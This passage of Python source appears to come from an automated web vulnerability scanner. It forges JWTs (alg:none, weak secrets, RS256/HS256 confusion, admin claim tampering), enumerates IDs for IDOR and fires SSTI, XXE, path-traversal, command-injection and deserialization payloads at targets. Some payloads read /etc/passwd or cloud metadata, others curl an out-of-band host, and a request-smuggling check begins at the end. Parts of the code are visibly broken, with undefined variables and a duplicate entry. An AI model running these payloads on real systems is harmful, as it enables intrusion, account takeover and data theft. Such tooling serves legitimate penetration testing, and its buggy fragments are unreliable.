                       "changeit","letmein","","jwt","token","pass","key",
                       "your-256-bit-secret","your-secret","app_secret"]:
            sig=hmac.new(secret.encode(),signing,hashlib.sha256).digest()
            if _jwt_b64e(sig)==expected:
                return (secret,token)
    except: pass
    return ("","")

def _jwt_modify_claims(token:str)->list:
    try:
        parts=token.split(".")
        payload=json.loads(_jwt_b64d(parts[1]))
        variants=[]
        for k in ["role","roles","group","is_admin","isAdmin","admin","user_type","scope","type"]:
            if k in payload:
                orig=payload[k]
                for val in (["admin","administrator","superuser","root"] if isinstance(orig,str)
                            else [True]):
                    if val==orig: continue
                    mod=dict(payload); mod[k]=val
                    new_p=_jwt_b64e(json.dumps(mod,separators=(",",":")).encode())
                    variants.append((f"{k}:{orig}→{val}",f"{parts[0]}.{new_p}."))
        if "exp" in payload:
            mod=dict(payload); mod["exp"]=int(time.time())+86400*365
            new_p=_jwt_b64e(json.dumps(mod,separators=(",",":")).encode())
            variants.append(("exp+365days",f"{parts[0]}.{new_p}."))
        return variants[:4]
    except: return []

def check_jwt_vulns(endpoints:List[str]) -> List[dict]:
    import re as _re
    """Real JWT attacks: alg:none, RS256→HS256 confusion, weak secret, claim manipulation."""
    findings=[]
    jwt_re=re.compile(r'eyJ[a-zA-Z0-9_-]{10,}\\.[a-zA-Z0-9_-]{10,}\\.[a-zA-Z0-9_-]*')
    jwks_cache={}

    for ep in endpoints[:80]:
        r=_get(ep,timeout=8)
        if not r: continue
        status,hdrs,body=r
        tokens=set(jwt_re.findall(body))
        for hv in hdrs.values(): tokens.update(jwt_re.findall(str(hv)))

        for token in list(tokens)[:3]:
            try:
                parts=token.split(".")
                if len(parts)!=3: continue
                hdr=json.loads(_jwt_b64d(parts[0]))
                pld=json.loads(_jwt_b64d(parts[1]))
                alg=hdr.get("alg","")

                auth_eps=[ep]+[e for e in endpoints[:30] if
                               any(k in e.lower() for k in
                                   ["user","profile","me","account","admin","dashboard"])]

                # ── 1. alg:none ───────────────────────────────────────────
                fn=_jwt_forge_none(token)
                if fn:
                    for tep in auth_eps[:5]:
                        tr=_get(tep,timeout=5,
                               headers={"Authorization":f"Bearer {fn}",
                                        "Cookie":f"token={fn};jwt={fn};access_token={fn}"})
                        if tr and tr[0]==200 and tr[2]!=body:
                            findings.append(F("jwt","critical",tep,
                                "JWT alg:none bypass -- server accepts unsigned token",
                                algorithm=alg,forged=fn[:80]+"...",
                                poc=(f"python3 -c \"\nimport base64,json\n"
                                     f"h=json.loads(base64.urlsafe_b64decode('{parts[0]}=='))\n"
                                     f"h['alg']='none'\n"
                                     f"hb64=base64.urlsafe_b64encode(json.dumps(h).encode()).rstrip(b'=').decode()\n"
                                     f"print(f'{{{hb64}}}.{parts[1]}.')\n\""),
                                impact="Authentication bypass -- forge any user identity",
                                remediation="Reject alg:none. Whitelist allowed algorithms explicitly.")); break

                
                # ── 1b. Blank/empty secret brute force ───────────────────
                for blank in ["", " ", "secret", "password", "1234", "test",
                               "changeme", domain.split(".")[0] if "." in url else ""]:
                    forged_blank = _jwt_forge_hmac(token, blank)
                    if forged_blank:
                        for tep in auth_eps[:3]:
                            tr = _get(tep, timeout=5,
                                     headers={"Authorization": f"Bearer {forged_blank}"})
                            if tr and tr[0] == 200:
                                findings.append(F("jwt","critical",tep,
                                    f"JWT signed with weak/empty secret: '{blank}'",
                                    secret=blank if blank else "(empty)",
                                    forged=forged_blank[:40]+"...",
                                    poc=f"jwt.encode(dict(sub='admin'), '{blank}', algorithm='HS256')",
                                    impact="Forge any token -- authentication bypass",
                                    remediation="Use cryptographically random secrets ≥256 bits."))
                                break

# ── 2. RS256→HS256 confusion ──────────────────────────────
                if alg.upper()=="RS256":
                    base_url=urllib.parse.urlparse(ep).scheme+"://"+urllib.parse.urlparse(ep).netloc
                    if base_url not in jwks_cache:
                        jwks_cache[base_url]=""
                        for path in ["/.well-known/jwks.json","/jwks.json","/oauth/jwks",
                                     "/api/auth/jwks","/v1/keys"]:
                            jr=_get(base_url+path,timeout=5)
                            if jr and jr[0]==200 and "keys" in jr[2]:
                                jwks_cache[base_url]=jr[2]; break
                    if jwks_cache.get(base_url):
                        fh=_jwt_forge_hs256(token,jwks_cache[base_url])
                        if fh:
                            tr=_get(ep,timeout=5,headers={"Authorization":f"Bearer {fh}"})
                            if tr and tr[0] in (200,201):
                                findings.append(F("jwt","critical",ep,
                                    "JWT RS256→HS256 confusion -- public key used as HMAC secret",
                                    forged=fh[:80]+"...",
                                    poc=f"# Use JWKS public key as HMAC-SHA256 secret\n"
                                        f"# Tool: https://github.com/ticarpi/jwt_tool\n"
                                        f"python3 jwt_tool.py {token[:40]}... -X k "
                                        f"-pk {base_url}/.well-known/jwks.json",
                                    impact="Full auth bypass -- no private key needed",
                                    remediation="Enforce alg type server-side. Never use public key as HMAC secret."))

                # ── 3. Weak secret ────────────────────────────────────────
                if alg.upper().startswith("HS"):
                    sec,_=_jwt_try_weak_secrets(token)
                    if sec is not None and sec!="":
                        findings.append(F("jwt","critical",ep,
                            f"JWT signed with weak secret: '{sec}'",
                            secret=sec,algorithm=alg,
                            poc=(f"import jwt\n"
                                 f"forged=jwt.encode({{\'sub\':\'admin\',\'role\':\'admin\'}}"
                                 f",'{sec}\',algorithm='HS256')"),
                            impact="Forge any JWT -- full ATO, privilege escalation",
                            remediation="Use cryptographically random 256-bit secret. Rotate immediately."))

                # ── 4. Claim manipulation ─────────────────────────────────
                for desc,mod_tok in _jwt_modify_claims(token):
                    tr=_get(ep,timeout=5,headers={"Authorization":f"Bearer {mod_tok}"})
                    if tr and tr[0]==200:
                        findings.append(F("jwt","high",ep,
                            f"JWT claim manipulation accepted: {desc}",
                            change=desc,forged=mod_tok[:80]+"...",
                            poc=f"curl -H 'Authorization: Bearer {mod_tok[:60]}...' '{ep}'",
                            impact="Privilege escalation via claim tampering",
                            remediation="Validate signature before trusting claims.")); break

                # ── Always report exposure ────────────────────────────────
                if not any(f.get("url")==ep for f in findings):
                    findings.append(F("jwt","medium",ep,
                        f"JWT exposed in response (alg:{alg})",
                        algorithm=alg,claims=str(list(pld.keys()))[:100],
                        token_preview=token[:60]+"...",
                        attacks_available=("alg:none | RS256→HS256" if alg=="RS256"
                                           else "weak secret | claim manipulation"),
                        remediation="Use httpOnly cookies. Never expose tokens in response bodies."))
            except Exception as _e: log.debug(f"jwt {ep}: {_e}")

    # ── Extended SSTI payloads for more engines ───────────────────────────────
    EXTENDED_SSTI = [
        # Jinja2/Flask: math expression
        ("{{7*'7'}}", "7777777"),                    # Jinja2 string multiply
        ("{{7*'7'}}", "7777777"),         # Jinja2 string multiply
        ("{{lipsum.__globals__}}", "__builtins__"),    # Jinja2 globals
        # Twig (PHP)
        ("{{7*7}}", "49"),                             # Twig basic
        ("{%- set a = 7*7 -%}{{a}}", "49"),            # Twig set
        # Freemarker (Java)
        ("<#assign x = 7*7>${x}", "49"),               # Freemarker
        ("${7*7}", "49"),                              # Generic EL
        # Velocity (Java)
        ("#set($x = 7*7)$x", "49"),                   # Velocity
        # Pebble (Java)
        ("{{7 * 7}}", "49"),                           # Pebble
        # Smarty (PHP)
        ("{math equation='7*7'}", "49"),               # Smarty math
        # Mako (Python)
        ("${7*7}", "49"),                              # Mako
        # ERB (Ruby)
        ("<%= 7*7 %>", "49"),                          # ERB
        # ASP/Razor
        ("@(7*7)", "49"),                              # Razor
        # Handlebars
        ("{{#with}}", "with"),           # Handlebars
    ]

    for ep in endpoints[:100]:
        try:
            parsed = urllib.parse.urlparse(ep)
            qs = urllib.parse.parse_qs(parsed.query)
        except: continue
        for param in list(qs.keys())[:4]:
            orig = qs[param][0] if qs[param] else ""
            for payload, expected in EXTENDED_SSTI[:8]:
                nq = dict(qs); nq[param] = [payload]
                test = urllib.parse.urlunparse(parsed._replace(
                    query=urllib.parse.urlencode(nq, doseq=True)))
                r = _get(test, timeout=6)
                if r and expected in r[2] and payload not in r[2]:
                    # Payload evaluated → SSTI
                    findings.append(F("ssti","critical",ep,
                        f"SSTI via '{param}': {payload!r} → {r[2][r[2].find(expected):r[2].find(expected)+20]}",
                        param=param, payload=payload, expected=expected,
                        preview=r[2][:300],
                        poc=f"curl '{test}'",
                        impact="Template injection enables RCE — read files, execute OS commands",
                        remediation="Never pass user input to template engines. Use sandboxing.",
                        confidence=92))
                    break

    return findings

# ── 14. IDOR ─────────────────────────────────────────────────────────────────
IDOR_PATTERNS=[
    # Integer IDs
    (r'/api/v\d+/users?/(\d+)', "user"),
    (r'/api/v\d+/accounts?/(\d+)', "account"),
    (r'/api/v\d+/orders?/(\d+)', "order"),
    (r'/api/v\d+/profiles?/(\d+)', "profile"),
    (r'/api/v\d+/invoices?/(\d+)', "invoice"),
    (r'/api/v\d+/tickets?/(\d+)', "ticket"),
    (r'/api/v\d+/documents?/(\d+)', "document"),
    (r'/api/v\d+/files?/(\d+)', "file"),
    (r'\?user_?id=(\d+)', "user_id"),
    (r'\?account_?id=(\d+)', "account_id"),
    (r'\?customer_?id=(\d+)', "customer_id"),
    (r'\?order_?id=(\d+)', "order_id"),
    (r'\?invoice_?id=(\d+)', "invoice_id"),
    (r'\?uid=(\d+)', "uid"),
    (r'\?id=(\d+)', "generic_id"),
    (r'/users?/(\d+)', "user"),
    (r'/accounts?/(\d+)', "account"),
    (r'/profile/(\d+)', "profile"),
    (r'/download\?id=(\d+)', "download"),
    # UUID patterns (modern APIs)
    (r'/([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})', "uuid_path"),
    (r'\?[a-z_]*id=([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})', "uuid_param"),
    # GUID / ObjectID (MongoDB)
    (r'/([0-9a-f]{24})(?:/|\?|$)', "mongo_objectid"),
    (r'\?[a-z_]*id=([0-9a-f]{24})', "mongo_objectid_param"),
    # Base64-like encoded IDs
    (r'\?[a-z_]*id=([A-Za-z0-9+/=]{12,})', "encoded_id"),
    # Hash-like IDs
    (r'/([0-9a-f]{32,40})(?:/|\?|$)', "hash_id"),
]

# Predictable UUIDs for IDOR testing (common test values)
_IDOR_TEST_UUIDS = [
    "00000000-0000-0000-0000-000000000001",
    "00000000-0000-0000-0000-000000000002",
    "11111111-1111-1111-1111-111111111111",
    "ffffffff-ffff-ffff-ffff-ffffffffffff",
    "00000000-0000-0000-0000-000000000000",
]

def _mutate_uuid(uuid_str:str)->list:
    """Generate similar UUIDs to test IDOR."""
    variants=[uuid_str]
    try:
        parts=uuid_str.split("-")
        if len(parts)==5:
            # Increment last segment
            last=int(parts[-1],16)
            for delta in [1,2,-1,0xffff]:
                new_last=hex((last+delta)&0xffffffffffff)[2:].zfill(12)
                variants.append("-".join(parts[:-1]+[new_last]))
            # Common test UUIDs
            variants.extend(_IDOR_TEST_UUIDS)
    except: pass
    return variants[:8]

def _mutate_mongo_id(oid:str)->list:
    """Generate similar MongoDB ObjectIDs."""
    variants=[oid]
    try:
        num=int(oid,16)
        for delta in [1,2,-1,256]:
            variants.append(hex(num+delta)[2:].zfill(24)[:24])
    except: pass
    return variants[:5]

def _idor_response_differs(r1,r2)->bool:
    """Check if two responses show different data (real IDOR vs same data)."""
    if not (r1 and r2): return False
    if r1[0]!=200 or r2[0]!=200: return False
    if len(r2[2])<50: return False
    if r1[2]==r2[2]: return False
    # Must contain actual data fields
    data_keys=["id","email","name","user","account","phone","address",
                "username","first_name","last_name","created","updated"]
    if not any(k in r2[2].lower() for k in data_keys): return False
    # Size must be similar (not just an error page)
    ratio=len(r2[2])/max(len(r1[2]),1)
    return 0.1<ratio<10

def _try_idor_variations(ep:str,orig_id:str,id_type:str,obj_type:str,findings:list):
    """Try multiple ID variations for IDOR."""
    r1=_get(ep,timeout=6)
    if not r1 or r1[0]!=200: return

    if id_type=="uuid":
        test_ids=_mutate_uuid(orig_id)
    elif id_type=="mongo":
        test_ids=_mutate_mongo_id(orig_id)
    elif id_type=="int":
        try:
            n=int(orig_id)
            test_ids=[str(x) for x in [n+1,n+2,n-1,1,2,3,100,999]
                      if x>0 and str(x)!=orig_id]
        except: test_ids=[]
    else:
        test_ids=["1","2","test","admin"]

    for test_id in test_ids[:6]:
        test_url=ep.replace(orig_id,test_id,1)
        if test_url==ep: continue
        r2=_get(test_url,timeout=6)
        if _idor_response_differs(r1,r2):
            findings.append(F("idor","high",ep,
                f"IDOR/BOLA: {obj_type} access via {id_type} ID manipulation",
                original_id=orig_id,test_id=test_id,
                id_type=id_type,object_type=obj_type,
                response_preview=r2[2][:200],
                poc=(f"# Original:\ncurl '{ep}'\n"
                     f"# IDOR test:\ncurl '{test_url}'\n"
                     f"# Responses differ -- check for data belonging to other users"),
                impact="Access/modify other users' private data without authorization (BOLA/IDOR)",
                remediation="Server-side authorization check on every resource access. Never trust client-supplied IDs."))
            break

def check_idor(endpoints:List[str]) -> List[dict]:
    """
    IDOR/BOLA testing:
    1. Integer ID increment/decrement
    2. UUID variation testing
    3. MongoDB ObjectID enumeration
    4. Encoded/hash ID testing
    5. HTTP method switching (GET→POST→PUT→DELETE)
    """
    findings=[]
    seen=set()

    for ep in endpoints[:2000]:
        for pattern,obj_type in IDOR_PATTERNS:
            m=re.search(pattern,ep,re.I)
            if not m: continue
            orig_id=m.group(1)
            base_key=ep.replace(orig_id,"__ID__")
            if base_key in seen: continue
            seen.add(base_key)

            # Detect ID type
            if re.match(r'^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$',orig_id,re.I):
                id_type="uuid"
            elif re.match(r'^[0-9a-f]{24}$',orig_id,re.I):
                id_type="mongo"
            elif re.match(r'\d+',orig_id):
                id_type="int"
            else:
                id_type="other"

            _try_idor_variations(ep,orig_id,id_type,obj_type,findings)

    # ── BOLA: Test HTTP method switching on REST endpoints ────────────────────
    api_eps=[e for e in endpoints if re.search(r'/api/|/v\d+/|/rest/',e,re.I)][:30]
    for ep in api_eps:
        parsed=urllib.parse.urlparse(ep)
        if not parsed.query: continue
        for method in ["DELETE","PUT","PATCH"]:
            r=_req(ep,method,timeout=5)
            if r and r[0] in (200,201,204):
                # Check if action was performed (not just 200 on GET)
                findings.append(F("idor","high",ep,
                    f"Unauthorized {method} allowed on API endpoint",
                    method=method,
                    poc=f"curl -X {method} '{ep}'",
                    impact=f"Unauthorized {method} may allow data modification/deletion",
                    remediation="Implement authorization checks for all HTTP methods."))
                break
    # Windows path traversal
    WIN_PATHS = [
        "..\\..\\..\\windows\\win.ini",
        "..\\..\\..\\boot.ini",
        "c:\\windows\\win.ini",
        "c:/windows/win.ini",
        "..%5c..%5c..%5cwindows%5cwin.ini",
    ]
    WIN_SIGS = ["[fonts]","[extensions]","[boot loader]"]
    for ep in endpoints[:100]:
        if "=" not in ep: continue
        try:
            parsed=urllib.parse.urlparse(ep)
            qs=urllib.parse.parse_qs(parsed.query)
        except: continue
        for param,vals in list(qs.items())[:3]:
            for wp in WIN_PATHS[:3]:
                nq=dict(qs); nq[param]=[wp]
                test=urllib.parse.urlunparse(parsed._replace(query=urllib.parse.urlencode(nq,doseq=True)))
                r=_req(test,"GET",timeout=5)
                if r and any(sig in r[2] for sig in WIN_SIGS):
                    findings.append(F("lfi","critical",test,
                        f"Windows LFI: {wp}",
                        payload=wp,param=param,
                        poc=f"curl '{test}'",
                        impact="Read Windows system files -- credential exposure",
                        remediation="Validate file paths with strict allowlist.")); break


    return findings


# ── 15. XXE ───────────────────────────────────────────────────────────────────
XXE_PAYLOADS=[
    ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
     ["root:x:","root:!:","daemon:","nobody:"]),
    ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><foo>&xxe;</foo>',
     ["localhost","kali","ubuntu","debian"]),
    ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]><foo>&xxe;</foo>',
     ["fonts","extensions","mci"]),
    ('<?xml version="1.0"?><!DOCTYPE foo SYSTEM "http://169.254.169.254/latest/meta-data/"><!ELEMENT foo ANY>',
     ["ami-id","instance","AccessKeyId","SecretAccessKey"]),
    ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>',
     ["uid=","root","www-data"]),
    ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>',
     ["cm9vdA","YmluOg","ZGFlbW9u"]),
]

def check_xxe(endpoints:List[str], targets:List[str]) -> List[dict]:
    findings=[]
    for url in targets[:30]:
        for payload,sigs in XXE_PAYLOADS:
            r=_req(url,"POST",
                   headers={"Content-Type":"application/xml","Accept":"*/*"},
                   data=payload.encode(),timeout=10)
            if not r: continue
            if any(s in r[2] for s in sigs):
                findings.append(F("xxe","critical",url,
                    "XXE -- external entity injection confirmed",
                    payload=payload[:100],preview=r[2][:300],
                    poc=f"curl -X POST {url} -H 'Content-Type: application/xml' -d '{payload[:80]}'",
                    impact="Read arbitrary files, SSRF, potential RCE",
                    remediation="Disable external entity processing in XML parsers."))
                break
    return findings

# ── 16. RCE / COMMAND INJECTION ───────────────────────────────────────────────
RCE_PAYLOADS=[
    # Unix command injection -- basic
    (";id",                  "uid="),
    ("&&id",                 "uid="),
    ("||id",                 "uid="),
    ("|id",                  "uid="),
    ("$(id)",                "uid="),
    ("`id`",                 "uid="),
    ("\nid\n",               "uid="),
    # Unix -- with spaces encoded
    (";id;",                 "uid="),
    ("&id&",                 "uid="),
    ("|id|",                 "uid="),
    # Unix -- cat passwd
    (";cat /etc/passwd",     "root:"),
    ("&&cat /etc/passwd",    "root:"),
    ("||cat /etc/passwd",    "root:"),
    ("|cat /etc/passwd",     "root:"),
    ("$(cat /etc/passwd)",   "root:"),
    # Unix -- whoami
    (";whoami",              "root"),
    ("&&whoami",             "root"),
    ("||whoami",             "root"),
    # Unix -- with separators
    ("%0aid",                "uid="),
    ("%0a/usr/bin/id",       "uid="),
    ("%0a%0aid",             "uid="),
    ("\r\nid",               "uid="),
    # Space bypass
    (";{id}",                "uid="),
    (";$IFS$9id",            "uid="),
    (";id$IFS",              "uid="),
    # Windows
    ("&whoami",              "\\"),
    ("&&whoami",             "\\"),
    ("|whoami",              "\\"),
    ("||whoami",             "\\"),
    (";whoami",              "\\"),
    ("&dir",                 "Volume"),
    ("|dir",                 "Volume"),
    # Expression language / OGNL
    ("%{7*7}",               "49"),
    ("${7*7}",               "49"),
    ("{{7*7}}",              "49"),
    ("#{7*7}",               "49"),
    # Log4Shell
    ("${jndi:ldap://127.0.0.1/a}", ""),
    # Shell specific
    ("a;id",                 "uid="),
    ("a|id",                 "uid="),
    ("a&&id",                "uid="),
    ("a||id",                "uid="),
]

RCE_WORDLISTS = [
    os.path.join(os.path.dirname(os.path.abspath(__file__)), 'payloads', 'rce.txt'),
    os.path.expanduser("~/Desktop/recon/SecLists/Fuzzing/command-injection-commix.txt"),
    "/home/kali/Desktop/recon/SecLists/Fuzzing/command-injection-commix.txt",
    "/root/Desktop/recon/SecLists/Fuzzing/command-injection-commix.txt",
    "/usr/share/seclists/Fuzzing/command-injection-commix.txt",
]

def _load_rce_wordlist() -> List[tuple]:
    sigs = ["uid=","root:","Volume","49","error"]
    for path in RCE_WORDLISTS:
        if os.path.isfile(path):
            try:
                words = [l.strip() for l in open(path, errors="ignore")
                         if l.strip() and not l.startswith("#")]
                log.info(f"[rce] wordlist: {path} ({len(words)} payloads)")
                return [(w, "uid=") for w in words[:200]]
            except: pass
    return []

def check_rce(endpoints:List[str], oob_host: str = "") -> List[dict]:
    findings=[]
    tested=set()
    wl = _load_rce_wordlist()
    all_payloads = RCE_PAYLOADS + [(w,sig) for w,sig in wl if w not in [p for p,_ in RCE_PAYLOADS]]
    # Payload intelligence not wired for RCE — no rce family in canonical set.
    # RCE payloads (;id, `whoami`, ping probes) are in RCE_PAYLOADS already.
    # lab_only RCE payloads are excluded by design; no auto-injection of aggressive cmds.
    log.info(f"[rce] {len(all_payloads)} payloads")

    rce_params=["cmd","command","exec","execute","ping","host","ip","run",
                "shell","query","input","process","system","terminal","arg",
                "args","param","params","data","debug","test","value","code",
                "q","search","s","action","do","method","func","call","invoke"]

    for ep in endpoints[:300]:
        try:
            parsed=urllib.parse.urlparse(ep)
            qs=urllib.parse.parse_qs(parsed.query)
        except: continue
        # Test RCE-named params first, then ALL params (command injection can be anywhere)
        all_rce_params = [p for p in rce_params if p in qs] +                          [p for p in qs.keys() if p not in rce_params]
        for param in all_rce_params[:8]:  # cap at 8 params per endpoint
            if param not in qs: continue
            key=(ep.split("?")[0],param)
            if key in tested: continue
            tested.add(key)
            orig_val = qs[param][0] if qs[param] else ""
            for payload,expected in all_payloads[:30]:
                # Test with payload appended to original value
                nq=dict(qs); nq[param]=[orig_val+payload]
                test=urllib.parse.urlunparse(parsed._replace(
                    query=urllib.parse.urlencode(nq,doseq=True)))
                r=_get(test,timeout=10)
                if r and expected and expected in r[2]:
                    findings.append(F("rce","critical",ep,
                        f"Command injection in '{param}'",
                        param=param,payload=payload,
                        preview=r[2][:300],
                        poc=f"curl '{test}'",
                        impact="Full server compromise -- arbitrary OS command execution",
                        remediation="Never pass user input to system commands. Use safe APIs with allowlists."))
                    break

    # ── OOB / time-based RCE detection ───────────────────────────────────────
    if oob_host:
        OOB_RCE = [
            f";nslookup {oob_host}",
            f"&&nslookup {oob_host}",
            f"|nslookup {oob_host}",
            f"$(nslookup {oob_host})",
            f"`nslookup {oob_host}`",
            f";curl http://{oob_host}/rce",
            f"&&curl http://{oob_host}/rce",
            f"|curl http://{oob_host}/rce",
            f"$(curl http://{oob_host}/rce)",
            # Windows
            f"&nslookup {oob_host}&",
            f"|nslookup {oob_host}|",
        ]
        for ep in endpoints[:100]:
            try:
                parsed = urllib.parse.urlparse(ep)
                qs = urllib.parse.parse_qs(parsed.query)
            except: continue
            for param in list(qs.keys())[:5]:
                for pl in OOB_RCE[:3]:
                    nq = dict(qs); nq[param] = [pl]
                    test = urllib.parse.urlunparse(parsed._replace(
                        query=urllib.parse.urlencode(nq, doseq=True)))
                    _get(test, timeout=5)  # fire and check oob infra
                    findings.append(F("rce","high",ep,
                        f"Potential blind RCE via '{param}' -- OOB callback sent",
                        param=param, payload=pl,
                        poc=f"curl '{test}'  # check {oob_host} for DNS/HTTP callback",
                        impact="Remote code execution -- server executes OS commands",
                        remediation="Never pass user input to system calls. Use safe APIs.",
                        confidence=50,  # unconfirmed until OOB callback received
                        pattern_only=True))
                    break
    
    # ── Time-based RCE detection ──────────────────────────────────────────────
    TIME_RCE = [
        (";sleep 6",    6.0),
        ("&&sleep 6",   6.0),
        ("|sleep 6",    6.0),
        ("$(sleep 6)",  6.0),
        ("`sleep 6`",   6.0),
        # Windows
        ("&timeout 6&", 6.0),
        (";ping -c 6 127.0.0.1;", 6.0),
    ]
    _time_tested = set()
    for ep in endpoints[:50]:
        try:
            parsed = urllib.parse.urlparse(ep)
            qs = urllib.parse.parse_qs(parsed.query)
        except: continue
        rce_params = [p for p in qs if p in 
                      ["cmd","command","exec","shell","run","ping","host","query"]]
        for param in (rce_params or list(qs.keys())[:2]):
            key = (ep.split("?")[0], param)
            if key in _time_tested: continue
            _time_tested.add(key)
            for pl, delay in TIME_RCE[:3]:
                nq = dict(qs); nq[param] = [pl]
                test = urllib.parse.urlunparse(parsed._replace(
                    query=urllib.parse.urlencode(nq, doseq=True)))
                t0 = time.time()
                _get(test, timeout=int(delay)+4)
                elapsed = time.time() - t0
                if elapsed >= delay * 0.85:
                    findings.append(F("rce","critical",ep,
                        f"Time-based RCE via '{param}' (delay: {elapsed:.1f}s)",
                        param=param, payload=pl, delay=elapsed,
                        poc=f"curl '{test}'  # {delay}s delay = RCE confirmed",
                        impact="Confirmed remote code execution via time delay",
                        remediation="Never pass user input to system calls.",
                        confidence=78,
                        time_based=True))
                    break

    return findings

# ── 17. DESERIALIZATION ───────────────────────────────────────────────────────
def check_deserialization(targets:List[str]) -> List[dict]:
    findings=[]
    # Java deserialization magic bytes
    java_magic=b"\xac\xed\x00\x05"
    # Check for base64-encoded Java serialized objects in responses
    b64_java=base64.b64encode(java_magic).decode()[:4]  # rO0A
    for url in targets[:20]:
        r=_get(url,timeout=8)
        if not r: continue
        body=r[2]
        if "rO0A" in body or "aced0005" in body.lower():
            findings.append(F("deserialization","critical",url,
                "Java serialized object detected in response",
                preview=body[:200],
                note="rO0A = base64 Java serialized object magic bytes",
                impact="Insecure deserialization enables RCE via gadget chains",
                remediation="Implement deserialization filters, use serialization allowlists."))
        # PHP serialization patterns
        if re.search(r'O:\d+:"[a-zA-Z]+":\d+:\{',body):
            findings.append(F("deserialization","high",url,
                "PHP serialized object in response",
                preview=body[:200],
                impact="PHP object injection -- potential RCE via magic methods"))

    # ── Expanded deserialization detection ────────────────────────────────────
    # Magic bytes patterns for various serialization formats
    DESER_PATTERNS = [
        # Java serialization
        ("rO0A",              "Java serialized object (base64)",          "critical"),
        ("aced0005",          "Java serialized object (hex)",              "critical"),
        # Python pickle
        ("\x80\x02",         "Python pickle object",                      "high"),
        ("gASV",              "Python pickle (protocol 5, base64)",        "high"),
        # PHP serialization
        ("O:",                "PHP serialized object",                     "high"),
        ("a:",                "PHP serialized array (potential)",          "medium"),
        # .NET BinaryFormatter
        ("AAEAAAD/",          ".NET BinaryFormatter (base64)",             "critical"),
        # Ruby Marshal
        ("\x04\x08",         "Ruby Marshal serialized object",            "high"),
        # Apache Shiro RememberMe
        ("deleteMe",          "Apache Shiro cookie (RememberMe present)",  "high"),
        # Spring Security
        ("SPRING_SECURITY_REMEMBER_ME_COOKIE", "Spring Security cookie", "medium"),
    ]

    # Ysoserial-style detection via cookie/parameter injection
    SHIRO_TEST = base64.b64encode(b"\x00" * 32).decode()  # dummy to test Shiro response

    for url in targets[:30]:
        r = _get(url, timeout=8)
        if not r: continue
        _, hdrs, body = r

        # Check response body and headers for magic bytes
        check_str = body + " ".join(hdrs.values())

        for pattern, desc, sev in DESER_PATTERNS:
            if pattern in check_str or pattern.lower() in check_str.lower():
                if pattern in ("O:", "a:") and len(body) < 20: continue  # too short
                findings.append(F("deserialization", sev, url,
                    f"Deserialization exposure: {desc}",
                    pattern=pattern, preview=body[:200],
                    poc=f"curl '{url}'  # Response contains: {pattern}",
                    impact=f"Insecure deserialization ({desc}) -- potential RCE via gadget chains",
                    remediation="Validate/sign serialized data. Use allowlists. Consider JSON instead.",
                    confidence=80))

        # Check Apache Shiro - send malformed RememberMe cookie
        shiro_cookies = {k: v for k, v in hdrs.items()
                         if 'rememberme' in k.lower() or 'shiroCookie' in v.lower()}
        if shiro_cookies or 'rememberMe' in body:
            r2 = _get(url, timeout=6,
                      headers={"Cookie": f"rememberMe={SHIRO_TEST}"})
            if r2 and "deleteMe" in r2[1].get("Set-Cookie",""):
                findings.append(F("deserialization","high",url,
                    "Apache Shiro detected -- test for CVE-2016-4437 (Shiro-550 RCE)",
                    poc=f"# Use ysoserial with Shiro key\ncurl '{url}' -H 'Cookie: rememberMe=<ysoserial_payload>'",
                    impact="Apache Shiro cookie deserialization -- unauthenticated RCE if default/weak encryption key",
                    remediation="Update Shiro. Use strong random SecretKey. Enable AES-GCM.",
                    confidence=70))

        # Check ViewState (ASP.NET deserialization)
        if '__VIEWSTATE' in body or 'viewstate' in body.lower():
            import re as _vre
            vs_match = _vre.search(r'name="__VIEWSTATE"[^>]*value="([^"]{20,})"', body, _vre.I)
            if vs_match:
                vs_val = vs_match.group(1)
                if not vs_val.startswith("H4sI"):  # Not gzip compressed
                    findings.append(F("deserialization","medium",url,
                        "ASP.NET ViewState without encryption/MAC -- potential deserialization",
                        poc=f"Use ysoserial.net: ysoserial.exe -o base64 -g TypeConfuseDelegate -f ObjectStateFormatter",
                        impact="Unprotected ViewState may allow .NET deserialization RCE",
                        remediation="Set viewStateEncryptionMode=Always and enableViewStateMac=true in web.config",
                        confidence=65))

    return findings

# ── 18. HTTP REQUEST SMUGGLING ────────────────────────────────────────────────
def check_smuggling(targets:List[str]) -> List[dict]:
    """
    HTTP Request Smuggling detection via raw TCP socket timing.
    CL.TE: server uses Content-Length, proxy uses Transfer-Encoding.
    TE.CL: server uses Transfer-Encoding, proxy uses Content-Length.
    """
    findings=[]
    CRLF = "\r\n"
    for url in targets[:10]:
        try:
            parsed = urllib.parse.urlparse(url)
            host   = parsed.hostname or parsed.netloc
            port   = parsed.port or (443 if parsed.scheme=='https' else 80)
            path   = parsed.path or "/"
            use_ssl= parsed.scheme == 'https'

            # CL.TE raw request: Content-Length says 4, TE says chunked ending at 0
            cl_te_req = CRLF.join([
                f"POST {path} HTTP/1.1",
                f"Host: {host}",
                "Content-Type: application/x-www-form-urlencoded",
                "Content-Length: 4",
                "Transfer-Encoding: chunked",
                "",
                "1",
                "Z",
                "0",
                "",
                "",
            ])

            # TE.CL raw request: TE says chunked (0 bytes), CL says 6 bytes
            te_cl_req = CRLF.join([
                f"POST {path} HTTP/1.1",
                f"Host: {host}",
                "Content-Type: application/x-www-form-urlencoded",
                "Content-Length: 6",
                "Transfer-Encoding: chunked",
                "",
                "0",
                "",
                "",
            ])

            for label, raw_req in [("CL.TE", cl_te_req), ("TE.CL", te_cl_req)]:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(12)
                    sock.connect((host, port))
                    if use_ssl:
                        ctx = ssl.create_default_context()
                        ctx.check_hostname = False
                        ctx.verify_mode = ssl.CERT_NONE
